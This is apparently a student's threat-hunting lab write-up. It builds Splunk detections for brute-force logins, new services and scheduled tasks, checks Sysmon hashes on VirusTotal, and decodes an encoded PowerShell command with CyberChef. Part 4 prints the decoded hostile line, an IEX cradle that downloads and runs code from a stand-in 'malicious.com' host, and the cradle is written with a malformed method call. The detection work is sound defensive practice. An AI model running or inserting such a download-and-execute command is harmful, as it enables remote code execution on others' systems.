# Task 3 – Threat Hunting & Rule Creation

**Objective:** Proactively hunt for threats, create alerts, and analyze attacker techniques.

---

## Part 1 — Brute Force Detection Alert

**Simulated:** Multiple failed login attempts on Windows 10 VM

**Splunk Query Used:**
```
index=* sourcetype="wineventlog:security" EventCode=4625 
| stats count AS Failed_Attempts by Account_Name, Source_Network_Address 
| where Failed_Attempts > 5
```

**Alert Configuration:**
- Alert Name: `Brute Force - Multiple Failed Logins`
- Trigger Condition: Number of Results > 0
- Schedule: Every 1 hour (Cron)
- Action: Log Event

---

## Part 2 — Persistence Detection

### New Service Creation
```
index=* EventCode=7045
```
- Detects when a new service is installed (common attacker persistence method)

### Scheduled Task Creation
```
index=* EventCode=4698
```
- Detects scheduled task creation
- Initially no results → enabled Task Scheduler Operational log → Event ID 4698 detected ✅

**Why this matters:** Attackers use scheduled tasks and services to maintain 
access even after system reboot.

---

## Part 3 — Hash Analysis (IOC Lookup)

**Splunk Query to find file hashes:**
```
index=* sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational 
EventCode=1 Hashes=*
```

**Steps:**
1. Found hash values from Sysmon process creation logs (Event ID 1)
2. Copied SHA256 hash value from log
3. Searched on [VirusTotal](https://www.virustotal.com/gui/home/search)
4. Result: Detection ratio **0/70** — file not flagged as malicious

---

## Part 4 — Encoded PowerShell Detection & Decode

**Splunk Query to find PowerShell activity:**
```
index=* sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational 
EventCode=1 Image="*powershell.exe"
```

**What was found:**  
Encoded PowerShell command in CommandLine field — a common attacker technique 
to hide malicious commands.

**Decoded using CyberChef:**
- Tool: https://gchq.github.io/CyberChef/
- Recipe: `From Base64` → `UTF-16LE (1200)`
- Result: Script attempting to download and execute file from remote server
```
IEX (New-Object).DownloadService().DownloadString('http://malicious.com')
```

**Why this matters:** Attackers encode PowerShell commands to bypass 
basic security filters. Decoding reveals true intent.

---

## Key Event IDs Reference

| Event ID | Source | Description |
|----------|--------|-------------|
| 4625 | Security | Failed logon attempt |
| 4698 | Security | Scheduled task created |
| 7045 | System | New service installed |
| 1 | Sysmon | Process creation (with hash) |

---

## Outcome
- Created working brute force alert in Splunk
- Detected persistence mechanisms (services + scheduled tasks)
- Analyzed file hashes against threat intelligence (VirusTotal)
- Successfully decoded malicious encoded PowerShell command using CyberChef
